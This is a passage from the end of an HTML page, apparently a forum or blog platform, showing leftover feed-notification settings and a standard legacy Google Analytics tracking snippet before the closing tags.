			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>